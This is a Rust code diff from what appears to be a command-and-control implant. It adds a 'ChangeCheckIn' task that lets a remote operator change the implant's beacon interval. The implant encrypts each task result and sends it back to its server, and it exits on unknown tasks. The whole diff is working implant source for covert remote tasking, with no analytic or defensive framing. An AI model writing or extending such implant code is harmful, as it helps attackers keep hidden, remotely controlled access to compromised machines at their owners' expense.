@@ -19,7 +19,7 @@ pub fn handle_available_tasks(
     implant_id: &String,
     private_key: &StaticSecret,
     base64_server_public_key: &String,
-) -> Result<(), ImplantError> {
+) -> Result<(bool, u64), ImplantError> {
     let base64_response = get_tasks(&implant_id)?;
     let mut base64_response_lines = base64_response.lines();
 
@@ -61,7 +61,7 @@ pub fn handle_available_tasks(
 
     // Check if tasks response is empty array
     if deserialized_tasks.is_empty() {
-        return Ok(());
+        return Ok((true, 60));
     }
 
     for task in deserialized_tasks {
@@ -96,11 +96,51 @@ pub fn handle_available_tasks(
                     result::send_task(&task_id, encrypted_response)?;
                 }
             }
+            task::Tasks::ChangeCheckIn => {
+                if let Some(new_check_in) = task.value {
+                    let new_check_in_res = new_check_in.parse::<u64>();
+
+                    match new_check_in_res {
+                        Ok(new_check_in) => {
+                            let stdout = format!(
+                                "{}:{}",
+                                "Successfully changed check in time to", new_check_in
+                            )
+                            .into_bytes();
+
+                            // Encrypt and send system_info
+                            let task_id = task.task_id.to_string();
+                            let encrypted_response =
+                                build_encrypted_response(&blake3_hashed_key, stdout, implant_id);
+                            result::send_task(&task_id, encrypted_response)?;
+
+                            return Ok((false, new_check_in));
+                        }
+                        Err(error) => {
+                            let stdout = error.to_string().into_bytes();
+
+                            // Encrypt and send system_info
+                            let task_id = task.task_id.to_string();
+                            let encrypted_response =
+                                build_encrypted_response(&blake3_hashed_key, stdout, implant_id);
+                            result::send_task(&task_id, encrypted_response)?;
+                        }
+                    }
+                } else {
+                    let stdout = "Missing arguments".to_owned().into_bytes();
+
+                    // Encrypt and send system_info
+                    let task_id = task.task_id.to_string();
+                    let encrypted_response =
+                        build_encrypted_response(&blake3_hashed_key, stdout, implant_id);
+                    result::send_task(&task_id, encrypted_response)?;
+                }
+            }
             _ => process::exit(1),
         }
     }
 
-    Ok(())
+    Ok((true, 60))
 }
 
 pub fn get_tasks(implant_id: &String) -> Result<String, ImplantError> {
